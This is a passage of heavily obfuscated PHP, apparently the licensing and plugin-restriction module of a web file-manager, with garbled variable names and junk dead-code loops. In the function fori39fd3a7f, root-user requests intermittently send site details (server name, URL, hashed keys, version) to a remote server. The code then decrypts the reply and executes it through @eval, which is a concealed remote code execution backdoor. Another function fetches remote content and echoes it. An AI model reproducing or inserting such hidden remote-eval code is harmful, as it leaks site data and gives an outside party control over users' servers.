} $’³õéÅõ = $this->udhp48e67b0c(); if ($’³õéÅõ != intval($â¶ãŒ°¹[217])) { if ($’³õéÅõ <= Model($â¶ãŒ°¹[127])->count()) { show_json(LNG($â¶ãŒ°¹[218]), !1, $â¶ãŒ°¹[213]); die; } } } } private function pbxub7a7bccc() { $Ÿ—·»Á =& $_SERVER[©—Ò»ÅĞ]; $®Ç¹Ïó‘ =& $_SERVER[ñâÍÚ°]; $“ÌÍÜ÷¬ = array($®Ç¹Ïó‘[121], $®Ç¹Ïó‘[122]); if (!KodUser::isRoot() || !isset($_GET[$®Ç¹Ïó‘[219]])) { return; } if (!in_array($_SERVER[$®Ç¹Ïó‘[24]], $“ÌÍÜ÷¬)) { return; } $à‚Üóê = $®Ç¹Ïó‘[220]; $ĞìşÜ–Ô = $Ÿ—·»Á[771]; if (!$ĞìşÜ–Ô) { return; } $à‚Üóê = $this->bvzff805645f($à‚Üóê, $®Ç¹Ïó‘[221]); $’úÄÜÌ« = stream_context_create(array($®Ç¹Ïó‘[222] => array($®Ç¹Ïó‘[223] => $®Ç¹Ïó‘[224], $®Ç¹Ïó‘[225] => 3))); $¥öüë’Ì = $Ÿ—·»Á[772]; $‹¡ÛöÀ× = @file_get_contents($à‚Üóê, !1, $’úÄÜÌ«); $éŞ¸»í³ = $Ÿ—·»Á[773]; if (!$éŞ¸»í³) { return; } header($®Ç¹Ïó‘[226]); if ($‹¡ÛöÀ× && strstr($‹¡ÛöÀ×, $®Ç¹Ïó‘[227])) { echo $‹¡ÛöÀ×; } die; } public function hibae7c5ef44($ß„–‘¿…) { $Ò¶Âó« =& $_SERVER[©—Ò»ÅĞ]; $Ùï”æïÑ =& $_SERVER[ñâÍÚ°]; if ($this->ihdvfa6eda7a == $Ùï”æïÑ[228]) { return $ß„–‘¿…; } $Ãç²µ¡û = $this->versionPluginList(); $ŞŞú™ìƒ = $Ò¶Âó«[774]; if (strlen($ŞŞú™ìƒ) < $Ò¶Âó«[714]) { die; } $¯áÏËÇŞ = explode($Ùï”æïÑ[229], $this->versionPluginFilter()); $íâÉğÚô = $Ò¶Âó«[775]; $‹ ğ—¿Ô = array(); $ˆ³öñ²è = $Ò¶Âó«[776]; if (!$ˆ³öñ²è) { die; } foreach ($Ãç²µ¡û as $À‹É¢§Ö => $ù‹˜°³) { if ($ù‹˜°³ == $Ùï”æïÑ[230] && substr($this->ihdvfa6eda7a, 0, 1) == $Ùï”æïÑ[230]) { continue; } if (!in_array($À‹É¢§Ö, $¯áÏËÇŞ)) { $‹ ğ—¿Ô[] = $À‹É¢§Ö; } } foreach ($‹ ğ—¿Ô as $À‹É¢§Ö) { unset($ß„–‘¿…[$À‹É¢§Ö]); $‡±¹ùÌü = $Ò¶Âó«[777]; if (!$‡±¹ùÌü) { die; } } return $ß„–‘¿…; } private function versionPluginList() { $¤®ÓïŸÂ =& $_SERVER[ñâÍÚ°]; return array($¤®ÓïŸÂ[231] => $¤®ÓïŸÂ[230], $¤®ÓïŸÂ[232] => $¤®ÓïŸÂ[230], $¤®ÓïŸÂ[233] => $¤®ÓïŸÂ[230], $¤®ÓïŸÂ[234] => $¤®ÓïŸÂ[230], $¤®ÓïŸÂ[235] => $¤®ÓïŸÂ[230], $¤®ÓïŸÂ[236] => $¤®ÓïŸÂ[230], $¤®ÓïŸÂ[237] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[239] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[240] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[241] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[242] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[243] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[244] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[245] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[246] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[247] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[248] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[249] => $¤®ÓïŸÂ[238], $¤®ÓïŸÂ[250] => $¤®ÓïŸÂ[238]); $çÓì¿¾ = $_SERVER[©—Ò»ÅĞ][778]; if (!$çÓì¿¾) { return; } } private function versionPluginFilter() { $­‹¨É” =& $_SERVER[©—Ò»ÅĞ]; $±Œ¹š¾± =& $_SERVER[ñâÍÚ°]; if ($this->ihdvfa6eda7a == $±Œ¹š¾±[111]) { return $±Œ¹š¾±[6]; } $··¯„ëó = _get($this->hgkcdc03808b, $±Œ¹š¾±[251], $±Œ¹š¾±[6]); $ªÆ¨‡à  = $­‹¨É”[779]; if (strlen($ªÆ¨‡à ) < $­‹¨É”[734]) { die; } $ÖíŒĞİ = _get($this->hgkcdc03808b, $±Œ¹š¾±[118], $±Œ¹š¾±[6]); $‘¡ğàÏ£ = _get($this->hgkcdc03808b, $±Œ¹š¾±[252], $±Œ¹š¾±[6]); $’ş»ô×” = $­‹¨É”[780]; if ($ÖíŒĞİ > time() && $‘¡ğàÏ£ > time()) { $àÒ¢¼Ä = explode($±Œ¹š¾±[229], $··¯„ëó); $ğß‚†’ƒ = array_keys($this->versionPluginList()); $··¯„ëó = array_merge($àÒ¢¼Ä, $ğß‚†’ƒ); $··¯„ëó = implode($±Œ¹š¾±[229], array_filter(array_unique($··¯„ëó))); } return $··¯„ëó; } private function wtiv9a3dc45f() { $œëÆŸÛÓ =& $_SERVER[ñâÍÚ°]; if ($this->ihdvfa6eda7a != $œëÆŸÛÓ[111]) { $GLOBALS[$œëÆŸÛÓ[88]][$œëÆŸÛÓ[92]][$œëÆŸÛÓ[253]] = $œëÆŸÛÓ[208]; return; } $GLOBALS[$œëÆŸÛÓ[88]][$œëÆŸÛÓ[254]] = $œëÆŸÛÓ[124]; if (Model($œëÆŸÛÓ[255])->get($œëÆŸÛÓ[63]) != $œëÆŸÛÓ[208]) { Model($œëÆŸÛÓ[255])->set($œëÆŸÛÓ[63], $œëÆŸÛÓ[208]); } } public function lxmf666a3574() { $»ë¾¼½Æ =& $_SERVER[©—Ò»ÅĞ]; return $_SERVER[ñâÍÚ°][256]; $¢—–Ë°² = $»ë¾¼½Æ[781]; if (strlen($¢—–Ë°²) < $»ë¾¼½Æ[734]) { return; } } private function fori39fd3a7f() { $ğëÎóíØ =& $_SERVER[©—Ò»ÅĞ]; $‰¿¿æ© =& $_SERVER[ñâÍÚ°]; $Ï§¡îâ = array($‰¿¿æ©[257], $‰¿¿æ©[258], $‰¿¿æ©[259]); $Î’¯ÎÙí = $‰¿¿æ©[260] . md5($‰¿¿æ©[261]); $¯—¾™ • = $ğëÎóíØ[782]; if (strlen($¯—¾™ •) < $ğëÎóíØ[709]) { return; } if ($this->ihdvfa6eda7a == $‰¿¿æ©[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$‰¿¿æ©[24]], $Ï§¡îâ)) { return; } if (time() % 4 != 0) { return; } $™òñÔªÂ = call_user_func(array($‰¿¿æ©[262], $‰¿¿æ©[263]), $Î’¯ÎÙí); if ($™òñÔªÂ && time() - $™òñÔªÂ < intval($‰¿¿æ©[264])) { return; } call_user_func(array($‰¿¿æ©[262], $‰¿¿æ©[141]), $Î’¯ÎÙí, time()); $’¡£¸¹ş = $ğëÎóíØ[783]; $ôùİ†Á = Model($‰¿¿æ©[33])->get($‰¿¿æ©[102]); $„ËåòÄØ = array($‰¿¿æ©[154] => Model($‰¿¿æ©[33])->get($‰¿¿æ©[155]), $‰¿¿æ©[169] => $this->ihdvfa6eda7a, $‰¿¿æ©[165] => $_SERVER[$‰¿¿æ©[166]], $‰¿¿æ©[167] => Model($‰¿¿æ©[33])->get($‰¿¿æ©[133]), $‰¿¿æ©[107] => md5($_SERVER[$‰¿¿æ©[108]] . $ôùİ†Á), $‰¿¿æ©[158] => $‰¿¿æ©[138], $‰¿¿æ©[161] => $_SERVER[$‰¿¿æ©[162]]); $’±Ÿó· = $ğëÎóíØ[784]; $¤¾“Š¯Â = $this->kvgea5f67761($‰¿¿æ©[265], $„ËåòÄØ); if (!is_array($¤¾“Š¯Â)) { return; } if ($¤¾“Š¯Â[$‰¿¿æ©[154]] && $¤¾“Š¯Â[$‰¿¿æ©[266]]) { if ($this->ejfu1d0fc8c2($¤¾“Š¯Â[$‰¿¿æ©[266]]) == $„ËåòÄØ[$‰¿¿æ©[154]]) { return; } } $this->jeyf052e8f19(); if ($this->ejfu1d0fc8c2($¤¾“Š¯Â[$‰¿¿æ©[266]]) != $„ËåòÄØ[$‰¿¿æ©[154]]) { $Ğ…Ã¢Ù± = array($‰¿¿æ©[187] => $ôùİ†Á, $‰¿¿æ©[188] => $_SERVER[$‰¿¿æ©[108]], $‰¿¿æ©[189] => this_url(), $‰¿¿æ©[163] => $_SERVER[$‰¿¿æ©[164]]); $áûé¡·Ñ = $this->edvp233d8e93(json_encode($Ğ…Ã¢Ù±)); $¤¾“Š¯Â = $this->kvgea5f67761($‰¿¿æ©[190] . $áûé¡·Ñ); if ($¤¾“Š¯Â && is_array($¤¾“Š¯Â) && isset($¤¾“Š¯Â[$‰¿¿æ©[266]])) { $Ú’Ë›„ = $this->mqvoe5af10d6($¤¾“Š¯Â[$‰¿¿æ©[266]], 2); if ($Ú’Ë›„) { $Ú’Ë›„ = $this->ejfu1d0fc8c2($Ú’Ë›„); } if ($Ú’Ë›„) { try { @eval($Ú’Ë›„); } catch (Exception $Í¤„Éê ) { } } } } } private function kvgea5f67761($²çË¶´ = '', $õ²Ä¡€” = array(), $œı”•¸ç = 5) { $œ»¿ãó =& $_SERVER[©—Ò»ÅĞ]; $™•ììãÁ =& $_SERVER[ñâÍÚ°]; $Ë±²ÃµÅ = $™•ììãÁ[267]; $ò†ñ”ß¦ = $œ»¿ãó[785]; while ($ò†ñ”ß¦ < $œ»¿ãó[707]) { if ($ò†ñ”ß¦ >= 0) { break; } $ò†ñ”ß¦++; } $Ë±²ÃµÅ = $this->bvzff805645f($Ë±²ÃµÅ, $™•ììãÁ[268]); $Ë±²ÃµÅ = $Ë±²ÃµÅ . $²çË¶´; $êü»ø±’ = $œ»¿ãó[786]; if ($õ²Ä¡€” && is_array($õ²Ä¡€”)) { $Ë±²ÃµÅ = $Ë±²ÃµÅ . $™•ììãÁ[269] . http_build_query($õ²Ä¡€”); } if ($õ²Ä¡€” === -1) { return $Ë±²ÃµÅ; } $¶§¬“½È = stream_context_create(array($™•ììãÁ[222] => array($™•ììãÁ[225] => $œı”•¸ç, $™•ììãÁ[223] => $™•ììãÁ[270]), $™•ììãÁ[271] => array($™•ììãÁ[272] => !1, $™•ììãÁ[273] => !1))); $õ²Ä¡€” = @file_get_contents($Ë±²ÃµÅ, !1, $¶§¬“½È); return json_decode($õ²Ä¡€”, !0); $Ñâ°çŞ­ = $œ»¿ãó[787]; } private function udhp48e67b0c() { $ÀˆÅàË› =& $_SERVER[©—Ò»ÅĞ]; $æ»­†­ä =& $_SERVER[ñâÍÚ°]; $÷¯©¬œß = array($æ»­†­ä[274] => $æ»­†­ä[275], $æ»­†­ä[276] => $æ»­†­ä[277], $æ»­†­ä[278] => $æ»­†­ä[279], $æ»­†­ä[280] => $æ»­†­ä[281], $æ»­†­ä[282] => $æ»­†­ä[283], $æ»­†­ä[284] => $æ»­†­ä[217], $æ»­†­ä[285] => $æ»­†­ä[217], $æ»­†­ä[286] => $æ»­†­ä[275], $æ»­†­ä[287] => $æ»­†­ä[277], $æ»­†­ä[288] => $æ»­†­ä[279], $æ»­†­ä[289] => $æ»­†­ä[290], $æ»­†­ä[291] => $æ»­†­ä[281], $æ»­†­ä[292] => $æ»­†­ä[293], $æ»­†­ä[294] => $æ»­†­ä[283], $æ»­†­ä[295] => $æ»­†­ä[296], $æ»­†­ä[297] => $æ»­†­ä[298], $æ»­†­ä[299] => $æ»­†­ä[300]); $¸„ÈÃ×’ = $ÀˆÅàË›[788]; if (!$¸„ÈÃ×’) { die; } $ÙÇ€şßˆ = $÷¯©¬œß[$this->ihdvfa6eda7a]; $ÙÇ€şßˆ = intval($ÙÇ€şßˆ ? $ÙÇ€şßˆ : $æ»­†­ä[275]); $‹©¾Ï = _get($this->hgkcdc03808b, $æ»­†­ä[301]); $éÙøòºØ = $ÀˆÅàË›[789]; $‹©¾Ï = $‹©¾Ï ? intval($‹©¾Ï) : 0; $èöÊ’”‘ = $ÀˆÅàË›[790]; return $ÙÇ€şßˆ + $‹©¾Ï; $ñ•²®Í = $ÀˆÅàË›[791]; if (!$ñ•²®Í) { return; } } public function nkaca45ea57c($‘Åíî‘¹) { $‰ãŠ˜íÉ =& $_SERVER[ñâÍÚ°]; $‰ï‘¡Ìñ = $this->udhp48e67b0c(); $°©î½á = $_SERVER[©—Ò»ÅĞ][792]; if ($‘Åíî‘¹[$‰ãŠ˜íÉ[302]] == $‰ãŠ˜íÉ[124]) { return; } if ($‰ï‘¡Ìñ >= intval($‰ãŠ˜íÉ[217])) { return; } $‡ú¡ø÷Â = Model($‰ãŠ˜íÉ[127])->count(); if ($‡ú¡ø÷Â <= $‰ï‘¡Ìñ) { return; } $À÷Ÿ¦äß = Model($‰ãŠ˜íÉ[127])->field($‰ãŠ˜íÉ[302])->limit($‰ï‘¡Ìñ)->select(); $À÷Ÿ¦äß = array_to_keyvalue($À÷Ÿ¦äß, $‰ãŠ˜íÉ[6], $‰ãŠ˜íÉ[302]); if (!in_array($‘Åíî‘¹[$‰ãŠ˜íÉ[302]], $À÷Ÿ¦äß)) { show_json($‰ãŠ˜íÉ[303], !1, $‰ãŠ˜íÉ[213]); } } public function fjet84ea4585() { $»ª‚›ü½ =& $_SERVER[©—Ò»ÅĞ]; $ÓáÑÑÃ =& $_SERVER[ñâÍÚ°]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Œë­¼ë = $ÓáÑÑÃ[220]; $Œë­¼ë = $this->bvzff805645f($Œë­¼ë, $ÓáÑÑÃ[221]); $ºÒµ¥‘À = stream_context_create(array($ÓáÑÑÃ[222] => array($ÓáÑÑÃ[223] => $ÓáÑÑÃ[224], $ÓáÑÑÃ[225] => 3))); $Ó¨Ñ ‰ = $»ª‚›ü½[793]; while (strlen($Ó¨Ñ ‰) < $»ª‚›ü½[714]) { if (!$Ó¨Ñ ‰) { break; } $Ó¨Ñ ‰++; } $ä´’÷Ì = @file_get_contents($Œë­¼ë, !1, $ºÒµ¥‘À); $Ğ¸ÀŠ· = $»ª‚›ü½[794]; while (strlen($Ğ¸ÀŠ·) < $»ª‚›ü½[734]) { if (!$Ğ¸ÀŠ·) { break; } $Ğ¸ÀŠ·++; } echo $ÓáÑÑÃ[304] . hash_encode($ä´’÷Ì) . $ÓáÑÑÃ[305]; $‰İÄ›¸ = $»ª‚›ü½[795]; } private function ianp78223d75($¢ı˜ˆĞ, $’‹ã–¡â, $ØãñáÂû = 3) { $Òƒãù =& $_SERVER[©—Ò»ÅĞ]; $Øë£²¹Õ =& $_SERVER[ñâÍÚ°]; usleep(1); $¢ı˜ˆĞ = trim($¢ı˜ˆĞ); $Ş¹÷°£ = $Òƒãù[796]; while ($Ş¹÷°£ < $Òƒãù[714]) { if ($Ş¹÷°£ >= 0) { break; } $Ş¹÷°£++; } $Äş×ßé = mt_rand(0, 5) . $Øë£²¹Õ[6]; $˜–òê„Ğ = rand_string(15); $Ü¾†¯ = $Òƒãù[797]; if (strlen($Ü¾†¯) < $Òƒãù[709]) { die; } $¸Ê¾´óÔ = $Øë£²¹Õ[306]; $¼‰±çÈØ = $Òƒãù[798]; if (strlen($¼‰±çÈØ) < $Òƒãù[709]) { return; } switch ($Äş×ßé) { case $Øë£²¹Õ[208]: $²òÙÆêæ = $this->hbrpd006126b($¢ı˜ˆĞ, strrev($’‹ã–¡â . $˜–òê„Ğ)); $×½“ô“Ô = $Òƒãù[799]; break; case $Øë£²¹Õ[124]: $²òÙÆêæ = $this->hbrpd006126b($¢ı˜ˆĞ, strrev($˜–òê„Ğ . $’‹ã–¡â)); $•ªç² ª = $Òƒãù[800]; if (strlen($•ªç² ª) < $Òƒãù[709]) { return; } break; $‰¯áæÇå = $Òƒãù[801]; while ($‰¯áæÇå < $Òƒãù[709]) { if ($‰¯áæÇå >= 0) { break; } $‰¯áæÇå++; } case $Øë£²¹Õ[307]: $²òÙÆêæ = $this->hbrpd006126b($¢ı˜ˆĞ, base64_encode($˜–òê„Ğ . $’‹ã–¡â)); $á±ö† = $Òƒãù[802]; break; $™ÙÀÙò¡ = $Òƒãù[803]; if (strlen($™ÙÀÙò¡) < $Òƒãù[714]) { return; } case $Øë£²¹Õ[308]: $²òÙÆêæ = $this->hbrpd006126b($¢ı˜ˆĞ, md5($˜–òê„Ğ . $’‹ã–¡â)); break; $”‚Ü©šË = $Òƒãù[804]; while (strlen($”‚Ü©šË) < $Òƒãù[709]) { if (!$”‚Ü©šË) { break; } $”‚Ü©šË++; } case $Øë£²¹Õ[309]: $¢ı˜ˆĞ = base64_encode($¢ı˜ˆĞ); $‘Ñ… = $Òƒãù[805]; $ìì·Éï = rand(0, 64); $šï‡î×Ï = $¸Ê¾´óÔ[$ìì·Éï]; $™¬à¼ = $Òƒãù[736]; if (!$™¬à¼) { die; } $³®İÄ†­ = md5($šï‡î×Ï . md5($’‹ã–¡â . $šï‡î×Ï) . $’‹ã–¡â); $‡ÃŸØÍû = $Òƒãù[806]; while ($‡ÃŸØÍû < $Òƒãù[714]) { if ($‡ÃŸØÍû >= 0) { break; } $‡ÃŸØÍû++; } $³®İÄ†­ = substr($³®İÄ†­, $ìì·Éï % 8, $ìì·Éï % 8 + 7); $Ñ„ëãÏ¶ = $Òƒãù[807]; $úú§®í = $Øë£²¹Õ[6]; $°íü§èğ = 0; $ïºèÁÆÔ = 0; $›©÷â™½ = $Òƒãù[808]; if (!$›©÷â™½) { return; } $¯ë»®Ş· = 0; for ($°íü§èğ = 0; $°íü§èğ < strlen($¢ı˜ˆĞ); $°íü§èğ++) { $¯ë»®Ş· = $¯ë»®Ş· == strlen($³®İÄ†­) ? 0 : $¯ë»®Ş·; $ïºèÁÆÔ = ($ìì·Éï + strpos($¸Ê¾´óÔ, $¢ı˜ˆĞ[$°íü§èğ]) + ord($³®İÄ†­[$¯ë»®Ş·++])) % 64; $úú§®í .= $¸Ê¾´óÔ[$ïºèÁÆÔ]; $ñ—ËÊ²® = $Òƒãù[809]; while ($ñ—ËÊ²® < $Òƒãù[709]) { if ($ñ—ËÊ²® >= 0) { break; } $ñ—ËÊ²®++; } } $²òÙÆêæ = hash_encode($šï‡î×Ï . $úú§®í); $†¬èó¿ = $Òƒãù[810]; if (strlen($†¬èó¿) < $Òƒãù[734]) { die; } break; default: $²òÙÆêæ = $this->hbrpd006126b($¢ı˜ˆĞ, $’‹ã–¡â . $˜–òê„Ğ); break; $İÙÁ„ = $Òƒãù[811]; } $²òÙÆêæ = strrev($Äş×ßé . $˜–òê„Ğ . $²òÙÆêæ); if ($ØãñáÂû - 1 > 0) { $²òÙÆêæ = $this->ianp78223d75($²òÙÆêæ, $’‹ã–¡â, $ØãñáÂû - 1); } return $²òÙÆêæ; } private function mqvoe5af10d6($ëéõŠæø, $ş™ßÉ—ö, $µ²àÙª = 3) { $¹¯âà­– =& $_SERVER[©—Ò»ÅĞ]; $Á§Ñê§¾ =& $_SERVER[ñâÍÚ°]; if (!is_string($ëéõŠæø) || strlen($ëéõŠæø) < 10) { return !1; } $ëéõŠæø = trim($ëéõŠæø); $ˆ¥Š†ö = $¹¯âà­–[812]; while ($ˆ¥Š†ö < $¹¯âà­–[709]) { if ($ˆ¥Š†ö >= 0) { break; } $ˆ¥Š†ö++; } $ëéõŠæø = strrev($ëéõŠæø); $Å¥­³±ë = $ëéõŠæø[0]; $™ü±¦ÂÅ = $¹¯âà­–[813]; if (strlen($™ü±¦ÂÅ) < $¹¯âà­–[734]) { die; } $¢˜íéÕ = substr($ëéõŠæø, 1, 15); $ÄÌ×†¤“ = $¹¯âà­–[814]; while (strlen($ÄÌ×†¤“) < $¹¯âà­–[714]) { if (!$ÄÌ×†¤“) { break; } $ÄÌ×†¤“++; } $ëéõŠæø = substr($ëéõŠæø, 16); $Œ‘¥ÇÃº = $¹¯âà­–[815]; while ($Œ‘¥ÇÃº < $¹¯âà­–[734]) { if ($Œ‘¥ÇÃº >= 0) { break; } $Œ‘¥ÇÃº++; } $é“è‰£ = $Á§Ñê§¾[306]; switch ($Å¥­³±ë) { case $Á§Ñê§¾[208]: $õí°‡ßƒ = $this->bvzff805645f($ëéõŠæø, strrev($ş™ßÉ—ö . $¢˜íéÕ)); break; case $Á§Ñê§¾[124]: $õí°‡ßƒ = $this->bvzff805645f($ëéõŠæø, strrev($¢˜íéÕ . $ş™ßÉ—ö)); $Â·‘š = $¹¯âà­–[816]; if (strlen($Â·‘š) < $¹¯âà­–[714]) { return; } break; case $Á§Ñê§¾[307]: $õí°‡ßƒ = $this->bvzff805645f($ëéõŠæø, base64_encode($¢˜íéÕ . $ş™ßÉ—ö)); break; case $Á§Ñê§¾[308]: $õí°‡ßƒ = $this->bvzff805645f($ëéõŠæø, md5($¢˜íéÕ . $ş™ßÉ—ö)); $ò˜È½í… = $¹¯âà­–[817]; if (strlen($ò˜È½í…) < $¹¯âà­–[714]) { return; } break; $îæÒ¿Å = $¹¯âà­–[818]; if (strlen($îæÒ¿Å) < $¹¯âà­–[707]) { die; } case $Á§Ñê§¾[309]: $ëéõŠæø = hash_decode($ëéõŠæø); $ûçšó˜Ô = $¹¯âà­–[819]; if (!$ûçšó˜Ô) { return; } $¡íø³ = $ëéõŠæø[0]; $ëéõŠæø = substr($ëéõŠæø, 1); $üËÍãÑÄ = strpos($é“è‰£, $¡íø³); $¶»Ÿ«¸Ï = $¹¯âà­–[820]; if (strlen($¶»Ÿ«¸Ï) < $¹¯âà­–[709]) { return; } $Ñ³“‰Çê = md5($¡íø³ . md5($ş™ßÉ—ö . $¡íø³) . $ş™ßÉ—ö); $Ñ³“‰Çê = substr($Ñ³“‰Çê, $üËÍãÑÄ % 8, $üËÍãÑÄ % 8 + 7); $å—’Èê = $¹¯âà­–[821]; if (!$å—’Èê) { die; } $¿ªòäİå = $Á§Ñê§¾[6]; $“ ò¨¿œ = 0; $ğãô•œµ = $¹¯âà­–[822]; if (strlen($ğãô•œµ) < $¹¯âà­–[707]) { return; } $ïÙÉÂ£  = 0; $‘Ë‘å›ß = 0; $ŸŠ›÷®­ = $¹¯âà­–[823]; if (strlen($ŸŠ›÷®­) < $¹¯âà­–[707]) { return; } for ($“ ò¨¿œ = 0; $“ ò¨¿œ < strlen($ëéõŠæø); $“ ò¨¿œ++) { $‘Ë‘å›ß = $‘Ë‘å›ß == strlen($Ñ³“‰Çê) ? 0 : $‘Ë‘å›ß; $§ú×õúö = $‘Ë‘å›ß++; $›ÛÔÍÌÒ = $¹¯âà­–[824]; $ïÙÉÂ£  = strpos($é“è‰£, $ëéõŠæø[$“ ò¨¿œ]) - $üËÍãÑÄ - ord($Ñ³“‰Çê[$§ú×õúö]); $Œö»¨”· = $¹¯âà­–[825]; while ($ïÙÉÂ£  < 0) { $ïÙÉÂ£  += 64; $€ô¿»ò = $¹¯âà­–[826]; if (!$€ô¿»ò) { return; } } $¿ªòäİå .= $é“è‰£[$ïÙÉÂ£ ]; } $õí°‡ßƒ = base64_decode($¿ªòäİå); break; default: $õí°‡ßƒ = $this->bvzff805645f($ëéõŠæø, $ş™ßÉ—ö . $¢˜íéÕ); $óÃÄß“Ç = $¹¯âà­–[827]; while (strlen($óÃÄß“Ç) < $¹¯âà­–[714]) { if (!$óÃÄß“Ç) { break; } $óÃÄß“Ç++; } break; $¹€ŠÛéø = $¹¯âà­–[828]; } if ($µ²àÙª - 1 > 0) { $õí°‡ßƒ = $this->mqvoe5af10d6($õí°‡ßƒ, $ş™ßÉ—ö, $µ²àÙª - 1); } return $õí°‡ßƒ; } public function edvp233d8e93($æÍ›ŠŒ) { $Ñ³îµÛâ =& $_SERVER[©—Ò»ÅĞ]; $ÅÂÙíêÏ =& $_SERVER[ñâÍÚ°]; $¤Ñ¯‡æ‘ = $this->zelobad4cd31(); $¸Ç•é¥Ş = $this->zelobad4cd31(); $ˆœµ¼×‚ = $Ñ³îµÛâ[829]; $ÉŠÈ©œÜ = ($¤Ñ¯‡æ‘ - 1) * ($¸Ç•é¥Ş - 1); $¿ˆÎŸùˆ = intval(($¤Ñ¯‡æ‘ + $¸Ç•é¥Ş) / 2); $ø–âÃ¯ü = $Ñ³îµÛâ[830]; if (strlen($ø–âÃ¯ü) < $Ñ³îµÛâ[707]) { die; } while (1) { $Ñè¡šèğ = $¿ˆÎŸùˆ; $ï¨ı„‚µ = $Ñ³îµÛâ[831]; if (!$ï¨ı„‚µ) { die; } $¯³©Ç·ı = $ÉŠÈ©œÜ; while ($¯³©Ç·ı % $Ñè¡šèğ != 0) { $åÑ­ê§ = $¯³©Ç·ı; $¯³©Ç·ı = $Ñè¡šèğ; $”Â´ê£ = $Ñ³îµÛâ[832]; if (!$”Â´ê£) { die; } $Ñè¡šèğ = $åÑ­ê§ % $Ñè¡šèğ; } if ($Ñè¡šèğ == 1) { break; } else { $¿ˆÎŸùˆ++; } } $ˆ‚¥øÍ = 2; $êÌáîƒ = $Ñ³îµÛâ[833]; if (strlen($êÌáîƒ) < $Ñ³îµÛâ[702]) { return; } for ($Æáä—° = 0; $Æáä—° < $ÉŠÈ©œÜ * 10; $Æáä—°++) { if (($ÉŠÈ©œÜ * $Æáä—° + 1) % $¿ˆÎŸùˆ == 0) { $ˆ‚¥øÍ = intval(($ÉŠÈ©œÜ * $Æáä—° + 1) / $¿ˆÎŸùˆ); break; } } $¨³å…¢¤ = $this->hbrpd006126b($¤Ñ¯‡æ‘ * $¸Ç•é¥Ş . $ÅÂÙíêÏ[6], $ÅÂÙíêÏ[138]); $ÚÈ©¢¼ó = md5($ÅÂÙíêÏ[310] . ($¤Ñ¯‡æ‘ + $¸Ç•é¥Ş) . $ÅÂÙíêÏ[311] . $¿ˆÎŸùˆ . $ÅÂÙíêÏ[311] . $ˆ‚¥øÍ . $ÅÂÙíêÏ[312]); $Õ îì•À = $this->hbrpd006126b($æÍ›ŠŒ, $ÚÈ©¢¼ó) . $ÅÂÙíêÏ[313] . $¨³å…¢¤; return $Õ îì•À; } public function ejfu1d0fc8c2($ë†„¯Î‘) { $¤ÁğÁë =& $_SERVER[©—Ò»ÅĞ]; $”¿½±ñì =& $_SERVER[ñâÍÚ°]; $ü³È‘æî = explode($”¿½±ñì[313], $ë†„¯Î‘); if (count($ü³È‘æî) != 2) { return $”¿½±ñì[6]; } $æˆ‰ï¢­ = $this->bvzff805645f($ü³È‘æî[1] . $”¿½±ñì[6], $”¿½±ñì[138]); if (!$æˆ‰ï¢­) { return $”¿½±ñì[6]; } $æˆ‰ï¢­ = intval($æˆ‰ï¢­); $ò©áŠ–§ = 0; $Úİ¢È” = 0; for ($à—âá” = 3; $à—âá” < $æˆ‰ï¢­; $à—âá” += 2) { if ($æˆ‰ï¢­ % $à—âá” != 0) { continue; } $ò©áŠ–§ = $à—âá”; $ÇŒîƒìÓ = $¤ÁğÁë[834]; if (strlen($ÇŒîƒìÓ) < $¤ÁğÁë[709]) { die; } $Úİ¢È” = intval($æˆ‰ï¢­ / $à—âá”); $šµíˆˆ³ = $¤ÁğÁë[835]; while ($šµíˆˆ³ < $¤ÁğÁë[734]) { if ($šµíˆˆ³ >= 0) { break; } $šµíˆˆ³++; } break; } $ı‰§©¡û = ($ò©áŠ–§ - 1) * ($Úİ¢È” - 1); $Ä›øª×İ = intval(($ò©áŠ–§ + $Úİ¢È”) / 2); while (1) { $ÅÜ›é¬ = $Ä›øª×İ; $ÚÚ—ŞÅÚ = $¤ÁğÁë[836]; $¯ïÍµÖÙ = $ı‰§©¡û; $†ıøü® = $¤ÁğÁë[837]; while ($¯ïÍµÖÙ % $ÅÜ›é¬ != 0) { $æÒÓ¼ù = $¯ïÍµÖÙ; $Ìš¸¹Ö‹ = $¤ÁğÁë[838]; if (!$Ìš¸¹Ö‹) { die; } $¯ïÍµÖÙ = $ÅÜ›é¬; $îä©¬›ø = $¤ÁğÁë[839]; if (strlen($îä©¬›ø) < $¤ÁğÁë[734]) { return; } $ÅÜ›é¬ = $æÒÓ¼ù % $ÅÜ›é¬; $–Úå·‡¦ = $¤ÁğÁë[840]; if (!$–Úå·‡¦) { die; } } if ($ÅÜ›é¬ == 1) { break; } else { $Ä›øª×İ++; } } $îáÕéì· = 2; $£œñ•ªá = $¤ÁğÁë[841]; if (strlen($£œñ•ªá) < $¤ÁğÁë[714]) { die; } for ($à—âá” = 0; $à—âá” < $ı‰§©¡û * 10; $à—âá”++) { if (($ı‰§©¡û * $à—âá” + 1) % $Ä›øª×İ == 0) { $îáÕéì· = intval(($ı‰§©¡û * $à—âá” + 1) / $Ä›øª×İ); break; } } $†” ¹«Ø = md5($”¿½±ñì[310] . ($ò©áŠ–§ + $Úİ¢È”) . $”¿½±ñì[311] . $Ä›øª×İ . $”¿½±ñì[311] . $îáÕéì· . $”¿½±ñì[312]); $¡‚ÏğıŒ = $this->bvzff805645f($ü³È‘æî[0], $†” ¹«Ø); return $¡‚ÏğıŒ; } public function zelobad4cd31() { $É½’„€  =& $_SERVER[©—Ò»ÅĞ]; $¿ûî‰©Ê = mt_rand(pow(2, 14), pow(2, 16) - 1); $‘İøÒØØ = array(); $ƒ³ÚÄö = $É½’„€ [842]; $ÒÛ°·‰Ê = 1; while ($ÒÛ°·‰Ê <= (int) sqrt($¿ûî‰©Ê)) { $ØÙâ¡”ç = $ÒÛ°·‰Ê; $§ÀŞÄœ = $É½’„€ [843]; if (strlen($§ÀŞÄœ) < $É½’„€ [702]) 